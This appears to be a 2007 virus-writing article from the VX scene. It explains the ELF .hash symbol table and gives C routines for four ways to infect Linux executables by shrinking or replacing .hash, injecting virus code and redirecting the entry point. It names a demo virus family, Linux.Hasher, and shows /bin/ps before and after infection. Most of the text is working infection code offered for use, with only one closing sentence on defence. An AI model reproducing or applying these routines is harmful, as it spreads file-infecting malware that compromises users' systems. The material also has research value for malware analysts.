@@ -1,0 +1,585 @@
+Hashin' the elves
+
+herm1t
+October 2007
+
+
+
+Contents
+
+    • Introduction 
+         0 What .hash is needed for? 
+         0 How to use the examples from this article? 
+    • A. Making "dummy" hash 
+    • B. Removing .hash 
+    • C. Decreasing hash table size 
+    • D. Shrink hash and add the new segment 
+    • References 
+
+
+
+
+-Introduction-
+
+One day I was looking through the ELF files with objdump and called  my  attention  to  .hash
+section, and thought: gee, can't we take  some  advantage  of  it? Nice  section  after  all.
+Located in the code segment. Could it be shrinked or  removed? In  this  article  I  want  to
+share my findings.
+
+
+
+
+What .hash is needed for?
+
+Hash table is used to accelerate the access to the symbol table  (.dynsym). Arranged  in  the
+following way (every element is Elf32_Word):
+
+
+    [ nbuckets              ]
+    [ nchains               ]
+    [ buckets[0]            ]
+    .........................
+    [ buckets[nbuckets-1]   ]
+    [ chains[0]             ]
+    .........................
+    [ chains[nchains - 1]   ]
+
+
+nbuckets - arbitrary number (greater than zero and lesser than nchains, preferably a prime  -
+for more regular distribution of values in the table), nchains is  equal  to  the  number  of
+symbols).
+
+glibc uses the following function to lookup the symbols by name (elf/do-lookup.h):
+
+
+      for (symidx = map->l_buckets[hash % map->l_nbuckets];
+           symidx != STN_UNDEF;
+           symidx = map->l_chain[symidx])
+        {
+          sym = &symtab[symidx];
+ 
+          ...
+                
+          if (sym != ref && strcmp (strtab + sym->st_name, undef_name))
+            /* Not the symbol we are looking for.  */
+            continue;
+          ...
+
+
+Which is to say:
+
+  • Calculate the hash of name (the elf_hash function introduced in ELF format specification) 
+  • Take the value from the buckets[hash % nbuckets] as the index of symbol ( symtab  located
+    in .dynsym) 
+  • Compare the symbol's name, may it be a collision? (strtab located in .dynstr) 
+  • In the case of false match, look through the chains array 
+  • If the index is equal to zero (STN_UNDEF) - we're screwed now, symbol not found 
+
+
+I will try to illustrate this with an example of searching the strlen  symbol in /bin/ps from
+my system:
+
+
+(*) elf_hash("strlen") = 45
+.hash                            .dynsym                 .dynstr
+offset              +----+
+0   nbuckets        | 67 |
+4   nchains         | 74 |
+                    +----+
+8   buckets       0 |  0 |
+:                   :    :
+:                   :    :
+188     (*)----> 45 | 60 | ----> dynsym[60].st_name ---> "isatty" (no match)
+192              46 |  0 |     /
+196              47 |  0 |    /
+:                   :    :   /
+272              66 | 32 |  /  
+                    +----+ /
+                __________/  
+               /
+              /     +----+
+276 chains   /    0 |  0 |
+:           /       :    :
+464        |     47 | 31 |-----> dynsym[31].st_name ---> "strlen" (found!)
+:          |     ^  :    :
+:          |     |
+:          |      \_____________
+:          |                     \
+:          |        :    :        \
+516        +-->  60 | 47 | ----> dynsym[47].st_name ---> "strdup" (no match)
+520              61 | 0  |
+:                   :    :
+568              73 | 0  |
+:                   +----+
+
+
+If you still can't pick it up, check the description of ELF format [1].
+
+
+
+
+How to use the examples from this article?
+
+We first assume that the victim file was  already  found, checked  for  validity, opened  for
+read/write (handle - h, length - l), mapped into memory (mapping - m, ELF header - ehdr). All
+examples are in C. I also wrote four  versions (chapter and version numeration are identical)
+of demo virus (Linux.Hasher) for those who prefer assembly or just want to look the propposed
+methods of infection in action.
+
+
+Defined macros:
+
+
+#define FOR_EACH_PHDR   for (i = 0, phdr = (Elf32_Phdr*)(m + ehdr->e_phoff); i < ehdr->e_phnum; i++, phdr++)
+#define FOR_EACH_SHDR   for (i = 0, shdr = (Elf32_Shdr*)(m + ehdr->e_shoff); i < ehdr->e_shnum; i++, shdr++)
+#define MAKE_HOLE(off,size) do {                        \
+        ftruncate(h,l+size);                            \
+        m = mremap(m,l,l + size, 0);                    \
+        if (m == MAP_FAILED) {                          \
+                perror("MAP FAILED!");                  \
+                goto fini_close;                        \
+        }                                               \
+        if (off < l)                                    \
+                memmove(m+off+size, m+off, l-off);      \
+        l += size;                                      \
+} while(0)
+#define SHIFT_SHDRS(offset,delta) do {                  \
+        if (ehdr->e_shoff >= offset)                    \
+                ehdr->e_shoff += delta;                 \
+        FOR_EACH_SHDR                                   \
+                if (shdr->sh_offset >= offset)          \
+                        shdr->sh_offset += delta;       \
+} while(0)
+
+
+
+
+A. Making "dummy" hash
+
+At first, I just tried to remove the corresponding section, but due to dumb  mistake  it  was
+no-go (more about that in the next chapter). And I thought, suppose we constructed a hash  of
+minimal size such that do_lookup will always fail? Will the file mutilated in such a way work?
+It will. Let set nbuckets to 1 (x % 1 = 0) and buckets[0] to 0 (STN_UNDEF). That's  all, hash
+doesn't work, no more hits. The rest of  space  in  the  section (section size - 12 bytes) is
+free.
+
+
+NB! Setting nbuckets to zero will lead to Floating point exception in do_lookup_x
+(/lib/ld-linux.so), it is small wonder in that, isn't it?
+
+
+
+        uint32_t *hash;
+        /* find hash section */
+        FOR_EACH_SHDR
+                if (shdr->sh_type == SHT_HASH) {
+                        sh = shdr;
+                        break;
+                }
+        assert(sh != NULL);
+ 
+        /* do we have enough space? */
+        assert(code_len < sh->sh_size - 12);
+        
+        hash = (uint32_t*)(m + sh->sh_offset);
+        memset(hash, 0x00, sh->sh_size);
+        /* nbuckets = 1, so buckets[hash % 1] = buckets[0] = STN_UNDEF */
+        hash[0] = 1;
+        memcpy(&hash[3], code, code_len);
+        ehdr->e_entry = sh->sh_addr + 12;
+
+
+
+
+
+B. Removing .hash
+
+When I tried to remove hash, I tried to rename the section and clog up the  pointer  of  type
+DT_HASH in .dynamic, indeed the type of section should be changed in the Section Header Tbale
+(SHT) from SHT_HASH to SHT_PROGBITS (why not, it approaches reality), or to SHT_NULL (objdump
+will not show it). Clean .dynamic also (this step is optional):
+
+
+        int             dynsz;
+        Elf32_Dyn       *dyn;
+        /* save pointer to the .hash entry in the SHT and get dynamic */
+        FOR_EACH_SHDR {
+                if (shdr->sh_type == SHT_HASH)
+                        sh = shdr;
+                /* optional */
+                if (shdr->sh_type == SHT_DYNAMIC) {
+                        dynsz   = shdr->sh_size / sizeof(Elf32_Dyn);
+                        dyn     = (Elf32_Dyn*)(m + shdr->sh_offset);
+                }
+        }               
+        assert(sh != NULL);
+ 
+        /* do we have enough space? */
+        assert(code_len < sh->sh_size);
+        
+        /* remove DT_HASH from dynamic section (optional) */
+        for (i = 0; i < dynsz; i++)
+                if (dyn[i].d_tag == DT_HASH) {
+                        memmove(&dyn[i], &dyn[i+1], (dynsz - i - 2) * sizeof(Elf32_Dyn));
+                        break;
+                }
+        /* copy our code */     
+        memcpy(m + sh->sh_offset, code, code_len);
+        /* change .hash' type */
+        sh->sh_type = SHT_PROGBITS;
+        /* change entry point */
+        ehdr->e_entry = sh->sh_addr;
+
+
+Linux.Hasher.b doesn't clean the dynamic
+
+
+
+
+C. Decreasing hash table size
+
+It isn't neccessary to remove hash completely, let's try to reduce its size, such  that  both
+new hash and our virus will fit in the section. This method isn't a  very  practical, because
+there are not too many files with large hash in the system, but the method  of  building  the
+hash would come pat latter. Without hesitation, I got the code from TCC [2]. Here is slightly
+edited version:
+
+
+unsigned long elf_hash(const unsigned char *name)
+{
+    unsigned long h = 0, g;
+    while (*name) {
+        h = (h << 4) + *name++;
+        if (g = h & 0xf0000000)
+            h ^= g >> 24;
+        h &= ~g;
+    } return h;
+}
+void build_hash(uint32_t *hash, int nbuckets, int nchains, Elf32_Sym *sym, char *str) {
+        uint32_t        i, h, *buckets, *chains;
+        buckets = hash + 2;
+        chains  = buckets + nbuckets;
+        hash[0] = nbuckets;
+        hash[1] = nchains;
+        for (i = 1; i < nchains; i++) {
+                h = elf_hash(str + sym[i].st_name) % nbuckets;
+                if (buckets[h] == 0)
+                        buckets[h] = i;
+                else {
+                        h = buckets[h];
+                        while (chains[h] != 0)
+                                h = chains[h];
+                        chains[h] = i;
+                }
+        }
+}
+
+
+Don't forget to make memset(hash, 0, size_of_hash_section);!
+
+Minimal, maximal and average value of nbuckets for files from /bin:
+
+
+$ for i in /bin/*; do ./hstat $i; done|awk 'BEGIN{min=10000;max=0;n=0;s=0;}
+/^[0-9]/{if($1<min)min=$1;if($1>max)max=$1;s+=$1;n++}END{print min,max,s/n}'
+3 1031 87.1304
+
+
+Well, what is there to do
+
+
+  • Make sure that hash is large enough (nbuckets - (virus_size + 3) / 4 > 0) 
+  • Decrease nbuckets by the length of virus in dwords 
+  • Build new hash 
+  • Write the virus code at the end of section 
+
+
+By the way, the sh_link field can be used to find the needed sections:
+
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .interp           PROGBITS        08047134 000134 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08047148 000148 000020 00   A  0   0  4
+  [ 3] .dynstr           STRTAB          08047168 000168 00030a 00   A  0   0  1 <----+
+  [ 4] .gnu.liblist      GNU_LIBLIST     08047474 000474 00003c 14   A  3   0  4      |
+  [ 5] .gnu.conflict     RELA            080474b0 0004b0 00012c 0c   A  7   0  4      |
+  [ 6] .hash             HASH            08048168 001168 00023c 04   A  7   0  4 ---+ |
+  [ 7] .dynsym           DYNSYM          080483a4 0013a4 0004a0 10   A  3   1  4 <--+ |
+                                                                        +-------------+
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .		
+
+
+As thus:
+
+
+        Elf32_Sym       *sym = NULL;
+        char            *str = NULL;
+        FOR_EACH_SHDR
+                if (shdr->sh_type == SHT_HASH) {
+                        sh = shdr;
+                        break;
+                }
+        assert(sh != NULL);
+        
+        shdr    = (Elf32_Shdr*)(m + ehdr->e_shoff);
+        u       = sh->sh_link;
+        sym     = (Elf32_Sym*)(m + shdr[u].sh_offset);
+        u       = shdr[u].sh_link;
+        str     = (char*)(m + shdr[u].sh_offset);
+ 
+        uint32_t *hash = (uint32_t*)(m + sh->sh_offset), nb = hash[0], nc = hash[1];
+        assert( (nb - (code_len + 3)/4) > 1);
+        memset(m + sh->sh_offset, 0, (nb + nc + 2)*4);
+        nb -= (code_len + 3)/4;
+        build_hash(hash, nb, nc, sym, str);
+ 
+        t = (2 + nb + nc)*4;
+        memcpy(m + sh->sh_offset + t, code, code_len);
+        ehdr->e_entry = sh->sh_addr + t;
+
+
+Let's look how the hash table changed:
+
+
+BEFORE
+Name 'sigfillset', hash 0d06a614 buckets[12]=1
+ ... 1 (sigfillset)
+-> 1
+Name 'getgrnam', hash 0cae92ad buckets[61]=57
+ ... 57 (free)
+ ... 48 (lookup_wchan)
+ ... 30 (escape_command)
+ ... 2 (getgrnam)
+-> 2
+skipped
+Name '__gmon_start__', hash 0f4d007f buckets[35]=72
+ ... 72 (__gmon_start__)
+-> 72
+Name 'strcpy', hash 07ab8a79 buckets[5]=73
+ ... 73 (strcpy)
+-> 73
+AFTER
+27 hash buckets, 74 chains
+Name 'sigfillset', hash 0d06a614 buckets[1]=1
+ ... 1 (sigfillset)
+-> 1
+Name 'getgrnam', hash 0cae92ad buckets[7]=2
+ ... 2 (getgrnam)
+-> 2
+skipped
+Name '__gmon_start__', hash 0f4d007f buckets[6]=27
+ ... 27 (getpagesize)
+ ... 35 (readtask)
+ ... 67 (fwrite)
+ ... 72 (__gmon_start__)
+-> 72
+Name 'strcpy', hash 07ab8a79 buckets[23]=6
+ ... 6 (strchr)
+ ... 18 (signal_number_to_name)
+ ... 59 (get_pid_digits)
+ ... 73 (strcpy)
+-> 73
+
+
+
+
+D. Shrink hash and add the new segment
+
+I hope, that everybody familiar with the method of ELF file infection, that out of mere freak
+is called "additional" code segment [3], although in point of fact due  to  impossibility  to
+add new entry to the segment table (Program Header Table, PHT), the  entry  of  type  PT_NOTE
+replaced with PT_LOAD. We already knew how to find a bit of space in the code segment  (where
+the PHT resides), and nothing prevent us from increasing the table  size, and  really  add  a
+segment without detracting anything in any way.
+
+What is there to do:
+
+  • Look through the section table and memorize all needed pointers 
+  • Build new hash table with nbuckets lessen by 8 elements (this give us 32 bytes
+    (sizeof(Elf32_Phdr)) in code segment) 
+  • Shift all sections, starting from .hash and till and including the first (not zero)
+    by 32 bytes (increase sh_offset and sh_addr in SHT) 
+  • If the address of the segment in PHT is equal to the address of section, fix PHT
+    (these are PT_INTERP/.interp, PT_NOTE / .note.ABI-tag) 
+  • If the address of pointer in the dynamic array is equal to the address of section, fix it
+    also (it holds for DT_HASH/.hash, DT_SYMTAB/.dynsym etc) 
+  • Increase the number of PHT entries (ehdr->e_phnum++) and the size of PT_PHDR segment in
+    file and in memory (ph->p_filesz += 32; ph->p_memsz+=32) 
+  • Separate PHT after the last PT_LOAD and add another one 
+  • Father on, do the same as in the case of PT_NOTE replacement 
+       0 Select the address for the new segment (in our case - minimal address - 2 pages) 
+       0 Write the virus body to the end of file (Linux.Hasher.d does this) (or after the
+         last loadable segment like in the example below)
+       0 Fill the PHT entry 
+
+
+Like so:
+
+
+        Elf32_Dyn       *dyn = NULL;
+        Elf32_Sym       *sym = NULL;
+        char            *str = NULL;
+        int             hn, dynsz;
+        FOR_EACH_SHDR {
+                if (shdr->sh_type == SHT_DYNAMIC) {
+                        dyn = (Elf32_Dyn*)(m + shdr->sh_offset);
+                        dynsz = shdr->sh_size / sizeof(Elf32_Dyn);
+                }
+                if (shdr->sh_type == SHT_HASH) {
+                        sh = shdr;
+                        hn = i;
+                }
+                if (shdr->sh_type == SHT_DYNSYM) {
+                        sym = (Elf32_Sym*)(m + shdr->sh_offset);
+                        str = m + ((Elf32_Shdr*)(m + ehdr->e_shoff))[shdr->sh_link].sh_offset;
+                }
+        }
+        assert(sh != NULL);
+        assert(dyn != NULL);
+        uint32_t *hash = (uint32_t*)(m + sh->sh_offset);
+        assert(hash[0] > 9);
+ 
+        /* reduce hash size */
+        uint32_t nb, nc;
+        nb = hash[0];
+        nc = hash[1];
+        memset(hash, 0, (2 + nb + nc) * 4);
+        nb -= 8;
+        build_hash(hash, nb, nc, sym, str);
+        sh->sh_size -= 32;
+ 
+        /* shift sections */
+        int j, k;
+        for (k = hn, shdr = (Elf32_Shdr*)(m + ehdr->e_shoff); k > 0; k--) {
+                memmove(m + shdr[k].sh_offset + 32, m + shdr[k].sh_offset, shdr[k].sh_size);
+                /* fix PT_INTERP, PT_NOTE ... */
+                FOR_EACH_PHDR
+                        if (phdr->p_vaddr == shdr[k].sh_addr) {
+                                phdr->p_vaddr += 32;
+                                phdr->p_paddr += 32;
+                                phdr->p_offset += 32;
+                                break;
+                        }
+                /* fix .dynamic */
+                for (j = 0; dyn[j].d_tag != DT_NULL; j++)
+                        if (dyn[j].d_un.d_ptr == shdr[k].sh_addr)
+                                dyn[j].d_un.d_ptr += 32;
+                shdr[k].sh_addr += 32;
+                shdr[k].sh_offset += 32;
+        }
+ 
+        /* find min va (t), index of last PT_LOAD (u) and PT_PHDR (ph) */
+        t = 0xffffffff;
+        FOR_EACH_PHDR {
+                if (phdr->p_vaddr != 0 && phdr->p_vaddr < t)
+                        t = phdr->p_vaddr;
+                if (phdr->p_type == PT_LOAD)
+                        u = i;
+                if (phdr->p_type == PT_PHDR)
+                        ph = phdr;
+        }
+        ASSERT(t != 0xffffffff);
+ 
+        /* fix PT_PHDR */
+        ph->p_filesz += 32;
+        ph->p_memsz += 32;      
+        /* add new PHT entry */         
+        ehdr->e_phnum++;
+        phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
+        memmove(&phdr[u + 2], &phdr[u + 1], (ehdr->e_phnum - u - 1) * sizeof(Elf32_Phdr));
+        v = phdr[u].p_offset + phdr[u].p_filesz;
+        ph = &phdr[u + 1];
+        ph->p_type      = PT_LOAD;
+        ph->p_flags     = PF_R|PF_X;
+        ph->p_align     = 0x1000;
+        ph->p_offset    = v;
+        ph->p_filesz    = ph->p_memsz = code_len;
+        ph->p_vaddr     = ph->p_paddr = t - 2 * PAGE_SIZE + (v & (PAGE_SIZE - 1));
+        
+        MAKE_HOLE(v, PAGE_SIZE);
+        memset(m + v, 0x90, PAGE_SIZE);
+        memcpy(m + v, code, code_len);
+        SHIFT_SHDRS(v, PAGE_SIZE);
+ 
+        /* change entry point */
+        ehdr->e_entry = ph->p_vaddr;
+
+
+
+The changes in the file (/bin/ps + Linux.Hasher.d):
+
+Before infection
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08047034 0x08047034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08047134 0x08047134 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08047000 0x08047000 0x0ff88 0x0ff88 R E 0x1000
+  LOAD           0x010000 0x08057000 0x08057000 0x002fc 0x20654 RW  0x1000
+  DYNAMIC        0x010014 0x08057014 0x08057014 0x000d0 0x000d0 RW  0x4
+  NOTE           0x000148 0x08047148 0x08047148 0x00020 0x00020 R   0x4
+  GNU_EH_FRAME   0x00ff38 0x08056f38 0x08056f38 0x00014 0x00014 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+Section Headers:
+  ...
+  [ 1] .interp           PROGBITS        08047134 000134 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08047148 000148 000020 00   A  0   0  4
+  [ 3] .dynstr           STRTAB          08047168 000168 00030a 00   A  0   0  1
+  [ 4] .gnu.liblist      GNU_LIBLIST     08047474 000474 00003c 14   A  3   0  4
+  [ 5] .gnu.conflict     RELA            080474b0 0004b0 00012c 0c   A  7   0  4
+  [ 6] .hash             HASH            08048168 001168 00023c 04   A  7   0  4  
+  ...
+Dynamic section at offset 0x10014 contains 25 entries:
+  0x00000004 (HASH)                       0x8048168
+  0x00000005 (STRTAB)                     0x8047168
+  ...
+  0x6ffffef9 (GNU_LIBLIST)                0x8047474
+  ...
+  0x6ffffef8 (GNU_CONFLICT)               0x80474b0
+After
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08047034 0x08047034 0x00120 0x00120 R E 0x4
+  INTERP         0x000154 0x08047154 0x08047154 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08047000 0x08047000 0x0ff88 0x0ff88 R E 0x1000
+  LOAD           0x010000 0x08057000 0x08057000 0x002fc 0x20654 RW  0x1000
+  LOAD           0x01107c 0x0804607c 0x0804607c 0x003e8 0x003e8 R E 0x1000
+  DYNAMIC        0x010014 0x08057014 0x08057014 0x000d0 0x000d0 RW  0x4
+  NOTE           0x000168 0x08047168 0x08047168 0x00020 0x00020 R   0x4
+  GNU_EH_FRAME   0x00ff38 0x08056f38 0x08056f38 0x00014 0x00014 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+Section Headers:
+  ...
+  [ 1] .interp           PROGBITS        08047154 000154 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08047168 000168 000020 00   A  0   0  4
+  [ 3] .dynstr           STRTAB          08047188 000188 00030a 00   A  0   0  1
+  [ 4] .gnu.liblist      GNU_LIBLIST     08047494 000494 00003c 14   A  3   0  4
+  [ 5] .gnu.conflict     RELA            080474d0 0004d0 00012c 0c   A  7   0  4
+  [ 6] .hash             HASH            08048188 001188 00021c 04   A  7   0  4
+  ...
+Dynamic section at offset 0x10014 contains 25 entries:
+  0x00000004 (HASH)                       0x8048188
+  0x00000005 (STRTAB)                     0x8047188
+  ...
+  0x6ffffef9 (GNU_LIBLIST)                0x8047494
+  ...
+  0x6ffffef8 (GNU_CONFLICT)               0x80474d0
+
+
+To stop this kind of infection from working it is sufficient to place .hash  not  before, but
+after the code and data sections (they cannot be moved), that however will not interfere with
+the previous variants.
+
+Properly speaking, that is all. Any comments are welcome. herm1t@vx.netlux.org
+
+The sources of Linux.Hasher (a,b,c,d) attached.
+
+
+References
+
+ 1. Tool Interface Standard (TIS) Executable and Linking Format (ELF) Specification Version 1.2 (May 1995) 
+ 2. Tiny C Compiler http://fabrice.bellard.free.fr/tcc/ 
+ 3. Alexander Bartolich "The ELF Virus Writing HOWTO" (Feb 2003) 
+
